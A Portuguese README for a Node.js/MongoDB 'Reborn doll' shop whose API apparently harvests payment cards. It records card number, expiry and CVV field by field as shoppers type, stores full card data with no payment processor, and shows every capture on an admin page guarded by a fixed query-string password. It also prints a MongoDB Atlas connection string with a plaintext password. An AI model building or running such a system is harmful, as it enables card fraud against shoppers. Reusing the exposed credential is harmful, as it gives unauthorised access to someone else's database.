# Projeto Boneca Reborn - MongoDB + Node.js

Sistema de venda personalizada de bonecas Reborn, com captura progressiva de campos, pagamento Pix e cartão de crédito/débito com validações, e área de administração protegida.

## Requisitos

- Node.js v14 ou superior  
- NPM (gerenciador de pacotes)

## Variáveis de Ambiente

Na raiz do projeto, crie um arquivo `.env` (ou configure no seu provider) com a URI de conexão ao MongoDB Atlas:

```bash
MONGODB_URI="mongodb+srv://igorlcreis:PskuwOrsMTaZFnGU@cluster0.xcdkhke.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
```

> **Importante:** não versionar esse arquivo com sua senha em texto puro.

## Instalação

```bash
npm install
```

## Scripts no `package.json`

```json
"scripts": {
  "start": "node app.js",
  "dev": "nodemon app.js"
}
```

- `npm start` — executa o servidor em modo de produção.  
- `npm run dev` — executa com `nodemon` para desenvolvimento.

## Estrutura de Pastas

```
/
├─ app.js
├─ package.json
├─ package-lock.json
├─ README.md
└─ public/
   ├─ index.html
   ├─ pagamento-cartao.html
   └─ ...outros arquivos estáticos (CSS, JS, imagens)
```

## Como Rodar

```bash
npm start
```

Acesse no navegador:

- Front-end: `http://localhost:3000/`  
- Painel de admin: `http://localhost:3000/admin?senha=asap`

## Endpoints da API

### POST `/captura_campo`
Captura progressiva de cada campo preenchido pelo usuário.  
- **Request Body** (JSON):
  ```json
  {
    "sessionId": "uuid-ou-tabela-de-sessao",
    "campo":     "nome_titular" | "numero_cartao" | "validade" | "cvv" | "parcelamento",
    "valor":     "valor digitado"
  }
  ```
- **Response**:
  - `204 No Content` em caso de sucesso  
  - `500 Internal Server Error` em caso de falha

### POST `/captura_final`
Envia todos os dados após o clique em “Finalizar Pagamento”.  
- **Request Body** (JSON):
  ```json
  {
    "sessionId":    "uuid",
    "nome_titular": "Usuario Exemplo",
    "numero_cartao":"4111111111111111",
    "validade":     "12/25",
    "cvv":          "123",
    "parcelas":     3,
    "total":        499.90,
    "cep":          "12345678",
    "boneca":       "Sofia",
    "cabelo":       "Castanho"
  }
  ```
- **Response**:
  - `201 Created` em caso de sucesso  
  - `500 Internal Server Error` em caso de falha

### GET `/admin?senha=asap`
Painel de administração que exibe todos os registros de captura.  
- **Query Parameter**:
  - `senha=asap` — chave de acesso fixa  
- **Response**:
  - HTML com listas de pagamentos finalizados e capturas de campo

## Front-end

Coloque todos os arquivos estáticos dentro de `public/`.  
A personalização e pagamento do usuário são tratados via esses arquivos, que acionam os endpoints acima.

---

Qualquer dúvida, abra uma issue ou entre em contato!
